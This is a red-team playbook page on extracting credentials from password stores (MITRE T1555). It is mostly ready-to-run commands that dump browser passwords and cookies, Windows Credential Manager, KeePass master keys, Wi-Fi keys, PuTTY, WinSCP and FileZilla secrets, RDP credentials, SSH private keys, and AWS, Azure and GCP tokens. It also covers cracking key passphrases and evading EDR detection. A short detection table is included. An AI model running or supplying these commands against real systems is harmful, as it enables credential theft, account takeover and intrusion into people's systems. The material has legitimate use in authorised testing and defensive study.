# Credential Store Extraction

> **MITRE ATT&CK**: Credential Access > T1555 - Credentials from Password Stores
> **Platforms**: Windows / Linux / macOS
> **Required Privileges**: User (own credentials) / Local Admin (other users)
> **OPSEC Risk**: Low-Medium

## Strategic Overview

Modern operating systems and applications store credentials in numerous locations beyond
the OS credential stores (SAM, LSASS, LSA Secrets). As a Red Team Lead, you must recognize
that credential stores are often the path of least resistance -- extracting saved browser
passwords or SSH keys frequently yields more actionable credentials than complex LSASS
dumping, with significantly lower OPSEC risk.

**Why credential stores matter strategically:**
- Users save passwords for internal applications, VPNs, cloud consoles, and admin portals
- Browser credentials often include passwords for systems not accessible via AD authentication
- Cloud CLI caches contain tokens that bypass MFA entirely
- SSH keys provide persistent access without password knowledge
- Password manager databases may contain the keys to the entire kingdom

**Prioritization for credential store extraction:**
1. Browser credentials (Chrome/Edge) - highest volume, often includes cloud/SaaS passwords
2. Cloud CLI tokens (AWS/Azure/GCP) - bypass MFA, immediate cloud access
3. SSH keys and configs - Linux/DevOps lateral movement
4. RDP saved credentials - lateral movement to additional Windows hosts
5. Password manager databases - potential jackpot if master password is weak/extractable

## Technical Deep-Dive

### 1. Browser Credentials (Chrome / Edge / Brave)

```powershell
# Chrome credential locations:
# Login Data:    %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
# Cookies:       %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
# Local State:   %LOCALAPPDATA%\Google\Chrome\User Data\Local State (contains DPAPI-encrypted AES key)

# Edge (Chromium) - identical structure:
# %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

# Brave:
# %LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data
```

```
# SharpChrome - automated Chrome/Edge credential extraction
SharpChrome.exe logins                    # Extract saved passwords
SharpChrome.exe cookies                   # Extract cookies (session hijacking)
SharpChrome.exe logins /browser:edge      # Target Edge specifically
SharpChrome.exe cookies /format:json      # JSON output for cookie import

# SharpWeb - multi-browser credential extraction
SharpWeb.exe all                          # All browsers, all data

# Mimikatz - Chrome credential decryption
mimikatz.exe "dpapi::chrome /in:\"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data\" /unprotect" "exit"

# Manual SQLite extraction (requires DPAPI decryption)
# Copy Login Data (SQLite DB) while Chrome is closed
# Query: SELECT origin_url, username_value, password_value FROM logins
```

### 2. Firefox Credentials

```bash
# Firefox uses its own key storage (NSS/key4.db), NOT DPAPI

# Firefox credential locations:
# %APPDATA%\Mozilla\Firefox\Profiles\<profile>\logins.json
# %APPDATA%\Mozilla\Firefox\Profiles\<profile>\key4.db

# firefox_decrypt - extract Firefox saved passwords
python3 firefox_decrypt.py /path/to/profile/

# firepwd.py - decrypt Firefox passwords
python3 firepwd.py -d /path/to/profile/

# SharpWeb includes Firefox support
SharpWeb.exe firefox
```

### 3. Windows Credential Manager

```cmd
# List saved Windows credentials
cmdkey /list

# Detailed vault listing
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all

# PowerShell enumeration
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault
$vault.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ } | Select UserName, Resource, Password
```

```
# Mimikatz - dump Credential Manager
mimikatz.exe "privilege::debug" "vault::cred /patch" "exit"
mimikatz.exe "vault::list" "exit"

# SharpDPAPI - automated Credential Manager extraction
SharpDPAPI.exe credentials
SharpDPAPI.exe vaults
```

### 4. KeePass Database Extraction

```
# KeePass database files (.kdbx)
# Common locations:
# C:\Users\*\Documents\*.kdbx
# Network shares (search for *.kdbx)
dir /s /b C:\Users\*.kdbx

# KeeThief - extract KeePass master key from memory (while KeePass is open)
# Injects into KeePass process to extract the composite key
KeeThief.exe
# Returns the master key that can decrypt the .kdbx file

# KeeFarce - force KeePass to export its database (while open)
KeeFarce.exe
# Exports all entries to CSV in %APPDATA%

# Hashcat - crack KeePass database password
keepass2john.py database.kdbx > keepass_hash.txt
hashcat -m 13400 keepass_hash.txt wordlist.txt -r rules/best64.rule

# KeePass trigger exploitation (if KeePass XML config is writable)
# Add a trigger that exports the DB on open - persistence + extraction
```

### 5. Wi-Fi Passwords

```cmd
# List all saved Wi-Fi profiles
netsh wlan show profiles

# Extract password for specific SSID
netsh wlan show profile name="CorpWiFi" key=clear

# Bulk extraction (all profiles)
for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles ^| findstr "Profile"') do @echo --- %i --- & @netsh wlan show profile name="%i" key=clear 2>nul | findstr "Key Content"

# PowerShell extraction
(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $result = netsh wlan show profile name="$name" key=clear
    $pass = ($result | Select-String "Key Content\W+\:(.+)$").Matches.Groups[1].Value.Trim()
    [PSCustomObject]@{SSID=$name; Password=$pass}
}
```

### 6. PuTTY / WinSCP / FileZilla Sessions

```cmd
# PuTTY saved sessions (registry)
reg query HKCU\Software\SimonTatham\PuTTY\Sessions
# Each subkey contains: HostName, UserName, ProxyPassword, etc.

# PuTTY saved SSH keys
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys

# WinSCP saved sessions
reg query HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
# Passwords stored as encrypted values; can be decrypted with known algorithm

# WinSCP ini file alternative
type "%APPDATA%\WinSCP.ini"

# FileZilla saved credentials (plaintext XML!)
type "%APPDATA%\FileZilla\recentservers.xml"
type "%APPDATA%\FileZilla\sitemanager.xml"
# Passwords are base64 encoded (trivially decoded)

# MobaXterm
# %APPDATA%\MobaXterm\MobaXterm.ini
# Encrypted passwords, decryptable with known master password or DPAPI
```

### 7. RDP Saved Credentials

```cmd
# RDP saved connections
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s

# RDP .rdp files with saved passwords
dir /s /b C:\Users\*.rdp

# Decrypt RDP saved credentials (DPAPI-protected)
# Use SharpDPAPI or Mimikatz dpapi::cred
mimikatz.exe "dpapi::rdg /in:C:\Users\victim\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings /unprotect" "exit"

# Remote Desktop Connection Manager files
dir /s /b C:\Users\*.rdg
# Parse with SharpDPAPI or Mimikatz
```

### 8. SSH Keys and Configurations

```bash
# Linux SSH key locations
cat ~/.ssh/id_rsa                        # RSA private key
cat ~/.ssh/id_ed25519                    # Ed25519 private key
cat ~/.ssh/config                        # SSH config with hostnames and users
cat ~/.ssh/known_hosts                   # Previously connected hosts
cat ~/.ssh/authorized_keys               # Keys authorized for login

# Windows SSH keys (OpenSSH)
type C:\Users\%USERNAME%\.ssh\id_rsa
type C:\Users\%USERNAME%\.ssh\config

# Search for SSH keys across the system
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
dir /s /b C:\Users\*.pem C:\Users\id_rsa 2>nul

# Crack passphrase-protected SSH keys
ssh2john.py id_rsa > ssh_hash.txt
hashcat -m 22921 ssh_hash.txt wordlist.txt        # RSA/DSA OpenSSH
john --wordlist=wordlist.txt ssh_hash.txt
```

### 9. Cloud CLI Credential Caches

```bash
# AWS credentials
cat ~/.aws/credentials                    # Access key ID + Secret key
cat ~/.aws/config                         # Region, profile configs
# Environment variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN

# Azure CLI tokens
cat ~/.azure/msal_token_cache.json        # MSAL token cache
cat ~/.azure/azureProfile.json            # Subscription info
# az account get-access-token             # If Azure CLI is available

# GCP credentials
cat ~/.config/gcloud/application_default_credentials.json
cat ~/.config/gcloud/credentials.db       # SQLite with refresh tokens
cat ~/.config/gcloud/properties           # Project configuration
# Environment: GOOGLE_APPLICATION_CREDENTIALS

# See cloud-credential-access.md for detailed cloud extraction
```

### 10. LaZagne (Automated Multi-Source Extraction)

```cmd
# LaZagne extracts credentials from multiple sources automatically
lazagne.exe all                           # Extract from all sources
lazagne.exe browsers                      # Browsers only
lazagne.exe wifi                          # Wi-Fi passwords only
lazagne.exe sysadmin                      # PuTTY, WinSCP, FileZilla, etc.
lazagne.exe databases                     # Database client saved creds

# Python version (Linux/cross-platform)
python3 laZagne.py all

# Supported sources: Chrome, Firefox, IE, Opera, Outlook, Thunderbird,
# PuTTY, WinSCP, FileZilla, KeePass, Wi-Fi, Credential Manager, etc.

# OPSEC note: LaZagne is well-known and signatured by most AV/EDR
# Prefer targeted extraction with SharpChrome/SharpDPAPI for stealth
```

## Detection & Evasion

### Detection Indicators

| Indicator | Source | Detail |
|-----------|--------|--------|
| Browser DB file access | EDR file monitoring | Non-browser process accessing Login Data |
| Credential Manager API | Event ID 5379 | Credential Manager read events |
| Mass file access | EDR behavior | Process reading multiple credential files |
| LaZagne execution | AV/EDR signature | Known tool signature detection |
| DPAPI blob decryption | EDR API monitoring | CryptUnprotectData from unusual process |

### Evasion Techniques

1. **Copy and parse offline** - Copy credential files to attacker machine for extraction
2. **Use native tools** - cmdkey, netsh, vaultcmd are legitimate system utilities
3. **Target specific files** - Avoid mass sweeping; extract only known-valuable credentials
4. **Custom tooling** - Write simple scripts instead of using signatured tools
5. **Run as target user** - DPAPI decryption is seamless when running as the owning user
6. **Time-based access** - Access credential stores during normal business hours

## Cross-References

- [DPAPI Abuse](dpapi-abuse.md) - Underlying decryption mechanism for Windows credential stores
- [Cloud Credential Access](cloud-credential-access.md) - Detailed cloud token extraction
- [LSASS Dumping](lsass-dumping.md) - Alternative credential extraction from memory
- [Password Cracking](password-cracking.md) - Crack extracted hashes (KeePass, SSH keys, etc.)
- ../05-collection/ - Broader data collection from compromised hosts
- ../10-exfiltration/ - Exfiltrating credential databases

## References

- https://attack.mitre.org/techniques/T1555/
- https://github.com/GhostPack/SharpDPAPI
- https://github.com/djhohnstein/SharpChrome
- https://github.com/AlessandroZ/LaZagne
- https://github.com/GhostPack/SharpWeb
- https://github.com/denandz/KeeFarce
- https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
